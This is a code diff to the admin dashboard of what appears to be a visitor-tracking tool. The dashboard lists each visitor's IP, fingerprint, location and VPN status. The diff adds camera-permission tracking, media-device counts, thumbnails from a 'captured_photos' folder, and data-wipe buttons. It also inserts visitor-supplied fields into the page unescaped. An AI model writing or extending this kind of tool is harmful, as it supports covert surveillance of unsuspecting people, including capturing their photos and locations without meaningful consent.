@@ -132,6 +132,32 @@
       align-items: center;
       margin-bottom: 15px;
     }
+    .entry-header-left {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .profile-photo {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 3px solid #667eea;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .profile-photo-placeholder {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
     .entry-id {
       font-weight: bold;
       color: #667eea;
@@ -560,7 +586,10 @@
 <body>
   <div class="header">
     <h1>🔐 Admin Dashboard</h1>
-    <a href="/admin/logout" class="logout-btn">Logout</a>
+    <div style="display: flex; gap: 10px;">
+      <a href="/admin/photos" class="logout-btn">📷 Photos</a>
+      <a href="/admin/logout" class="logout-btn">Logout</a>
+    </div>
   </div>
 
   <div class="stats">
@@ -571,6 +600,10 @@
     <div class="stat-card">
       <h3>Today</h3>
       <div class="number" id="todayCount">0</div>
+    </div>
+    <div class="stat-card">
+      <h3>Camera Allowed</h3>
+      <div class="number" id="cameraAllowedCount">0</div>
     </div>
     <div class="stat-card">
       <h3>VPN Detected</h3>
@@ -591,6 +624,8 @@
       <input type="text" id="searchBox" class="search-box" placeholder="Search by IP, fingerprint, location...">
       <button class="btn" onclick="exportData()">Export CSV</button>
       <button class="btn" onclick="location.reload()">Refresh</button>
+      <button class="btn" onclick="clearAllData()" style="background: #dc3545;">Clear All Data</button>
+      <button class="btn" onclick="resetDatabase()" style="background: #6c757d;">Reset Database</button>
     </div>
 
     <div class="data-table">
@@ -607,9 +642,17 @@
         {% for entry in data %}
         <div class="data-entry" data-search="{{ entry.ip_address }} {{ entry.fingerprint }} {{ entry.location_data.city }} {{ entry.location_data.country }}">
           <div class="entry-header">
-            <div>
-              <span class="entry-id">#{{ entry.id }}</span>
-              <span class="entry-time">{{ entry.timestamp }}</span>
+            <div class="entry-header-left">
+              {% if entry.profile_photo %}
+                <img src="/captured_photos/{{ entry.profile_photo }}" alt="Profile" class="profile-photo" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                <div class="profile-photo-placeholder" style="display:none;">👤</div>
+              {% else %}
+                <div class="profile-photo-placeholder">👤</div>
+              {% endif %}
+              <div>
+                <span class="entry-id">#{{ entry.id }}</span>
+                <span class="entry-time">{{ entry.timestamp }}</span>
+              </div>
             </div>
             <div class="entry-actions">
               <button class="action-btn view-btn" onclick="viewDetails({{ entry.id }})">View Details</button>
@@ -684,6 +727,18 @@
                 {% endif %}
               </span>
             </div>
+            <div class="summary-item">
+              <span class="summary-label">Camera</span>
+              <span class="summary-value">
+                {% if entry.camera_permission and entry.camera_permission.granted == True %}
+                  <span class="vpn-badge vpn-no">✓ Allowed</span>
+                {% elif entry.camera_permission and entry.camera_permission.granted == False %}
+                  <span class="vpn-badge vpn-yes">✗ Denied</span>
+                {% else %}
+                  <span style="font-size: 11px; color: #999;">No Data</span>
+                {% endif %}
+              </span>
+            </div>
           </div>
         </div>
         {% endfor %}
@@ -709,8 +764,10 @@
     // Calculate stats
     const today = new Date().toISOString().split('T')[0];
     const todayCount = allData.filter(e => e.timestamp.startsWith(today)).length;
+    const cameraAllowedCount = allData.filter(e => e.camera_permission?.granted === true).length;
     const vpnCount = allData.filter(e => e.vpn_detection?.isVPN).length;
     document.getElementById('todayCount').textContent = todayCount;
+    document.getElementById('cameraAllowedCount').textContent = cameraAllowedCount;
     document.getElementById('vpnCount').textContent = vpnCount;
 
     // Search functionality
@@ -737,6 +794,13 @@
       const vpn = entry.vpn_detection || {};
       const storage = entry.storage_info || {};
       const conn = entry.connection_info || {};
+
+      // Fix camera permission boolean handling
+      const camera = entry.camera_permission || {};
+      // Ensure granted is actually a boolean
+      if (camera && camera.granted !== undefined) {
+        camera.granted = camera.granted === true || camera.granted === 'true' || camera.granted === 1;
+      }
 
       const formatDate = (timestamp) => {
         const d = new Date(timestamp);
@@ -907,6 +971,97 @@
                 <div class="info-row">
                   <span class="info-label">Latency</span>
                   <span class="info-value">${entry.network_info.rtt !== 'unknown' ? entry.network_info.rtt + ' ms' : 'Unknown'}</span>
+                </div>
+              </div>
+            </div>
+            ` : ''}
+
+            <!-- Camera Permission Card -->
+            ${camera && Object.keys(camera).length > 0 ? `
+            <div class="info-card">
+              <div class="info-card-header">
+                <span class="info-card-icon">📷</span>
+                <span class="info-card-title">Camera Permission</span>
+              </div>
+              <div class="info-card-body">
+                <div class="info-row">
+                  <span class="info-label">Status</span>
+                  <span class="info-value">
+                    ${camera.granted === true
+                      ? '<span class="info-badge badge-success">✓ Granted</span>'
+                      : camera.granted === false
+                        ? '<span class="info-badge badge-danger">✗ Denied</span>'
+                        : '<span class="info-badge badge-warning">Unknown (granted=' + camera.granted + ')</span>'}
+                  </span>
+                </div>
+                <div class="info-row">
+                  <span class="info-label">Message</span>
+                  <span class="info-value" style="max-width: 70%;">${camera.message || 'N/A'}</span>
+                </div>
+                ${camera.error ? `
+                <div class="info-row">
+                  <span class="info-label">Error</span>
+                  <span class="info-value" style="max-width: 70%; color: #dc3545;">${camera.error}</span>
+                </div>
+                ` : ''}
+                <div class="info-row" style="margin-top: 10px; padding-top: 10px; border-top: 1px solid #e9ecef;">
+                  <span class="info-label">Debug Data</span>
+                  <span class="info-value" style="font-family: monospace; font-size: 11px; max-width: 70%; word-break: break-all;">
+                    granted type: ${typeof camera.granted} | value: ${JSON.stringify(camera)}
+                  </span>
+                </div>
+              </div>
+            </div>
+            ` : `
+            <div class="info-card">
+              <div class="info-card-header">
+                <span class="info-card-icon">📷</span>
+                <span class="info-card-title">Camera Permission</span>
+              </div>
+              <div class="info-card-body">
+                <div class="info-row">
+                  <span class="info-label">Status</span>
+                  <span class="info-value">
+                    <span class="info-badge badge-warning">⚠ No Data Collected</span>
+                  </span>
+                </div>
+                <div class="info-row">
+                  <span class="info-label">Note</span>
+                  <span class="info-value" style="max-width: 70%; color: #856404;">This entry was collected before camera permission tracking was enabled.</span>
+                </div>
+              </div>
+            </div>
+            `}
+
+            <!-- Media Devices Card -->
+            ${entry.media_devices && entry.media_devices.supported ? `
+            <div class="info-card">
+              <div class="info-card-header">
+                <span class="info-card-icon">🎥</span>
+                <span class="info-card-title">Media Devices</span>
+              </div>
+              <div class="info-card-body">
+                <div class="info-row">
+                  <span class="info-label">Video Inputs</span>
+                  <span class="info-value">
+                    <span class="info-badge badge-info">${entry.media_devices.videoInputs || 0} camera(s)</span>
+                  </span>
+                </div>
+                <div class="info-row">
+                  <span class="info-label">Audio Inputs</span>
+                  <span class="info-value">
+                    <span class="info-badge badge-info">${entry.media_devices.audioInputs || 0} mic(s)</span>
+                  </span>
+                </div>
+                <div class="info-row">
+                  <span class="info-label">Audio Outputs</span>
+                  <span class="info-value">
+                    <span class="info-badge badge-info">${entry.media_devices.audioOutputs || 0} speaker(s)</span>
+                  </span>
+                </div>
+                <div class="info-row">
+                  <span class="info-label">Total Devices</span>
+                  <span class="info-value">${entry.media_devices.total || 0}</span>
                 </div>
               </div>
             </div>
@@ -1160,9 +1315,61 @@
       }
     }
 
+    async function clearAllData() {
+      const confirmation = confirm('⚠️ WARNING: This will permanently delete ALL collected data!\n\nAre you absolutely sure you want to continue?');
+      if (!confirmation) return;
+
+      // Double confirmation for safety
+      const doubleConfirm = confirm('This action CANNOT be undone!\n\nClick OK to permanently delete all ' + allData.length + ' entries.');
+      if (!doubleConfirm) return;
+
+      try {
+        const response = await fetch('/admin/api/clear-all', {
+          method: 'DELETE'
+        });
+
+        const result = await response.json();
+
+        if (response.ok) {
+          alert('✓ ' + result.message);
+          location.reload();
+        } else {
+          alert('Failed to clear data: ' + result.message);
+        }
+      } catch (error) {
+        alert('Error clearing data: ' + error.message);
+      }
+    }
+
+    async function resetDatabase() {
+      const confirmation = confirm('🔥 DANGER: This will permanently delete EVERYTHING!\n\n- All collected data\n- All captured photos\n- All photo files from disk\n\nThis will completely reset the database.\n\nAre you absolutely sure?');
+      if (!confirmation) return;
+
+      // Triple confirmation for safety
+      const doubleConfirm = confirm('⚠️ FINAL WARNING ⚠️\n\nThis action is IRREVERSIBLE and will delete:\n- ' + allData.length + ' data entries\n- All captured photos and files\n\nType YES in your mind and click OK to proceed.');
+      if (!doubleConfirm) return;
+
+      try {
+        const response = await fetch('/admin/api/reset-database', {
+          method: 'DELETE'
+        });
+
+        const result = await response.json();
+
+        if (response.ok) {
+          alert('✓ Database Reset Complete!\n\n' + result.message);
+          location.reload();
+        } else {
+          alert('Failed to reset database: ' + result.message);
+        }
+      } catch (error) {
+        alert('Error resetting database: ' + error.message);
+      }
+    }
+
     function exportData() {
       // Convert data to CSV
-      const headers = ['ID', 'Timestamp', 'IP Address', 'Browser', 'OS', 'Location', 'VPN', 'Fingerprint'];
+      const headers = ['ID', 'Timestamp', 'IP Address', 'Browser', 'OS', 'Location', 'Camera', 'VPN', 'Fingerprint'];
       const rows = allData.map(e => [
         e.id,
         e.timestamp,
@@ -1170,6 +1377,7 @@
         e.device_info?.browser || '',
         e.device_info?.os || '',
         `${e.location_data?.city || ''} ${e.location_data?.country || ''}`.trim(),
+        e.camera_permission?.granted ? 'Allowed' : (e.camera_permission?.granted === false ? 'Denied' : 'N/A'),
         e.vpn_detection?.isVPN ? 'Yes' : 'No',
         e.fingerprint || ''
       ]);
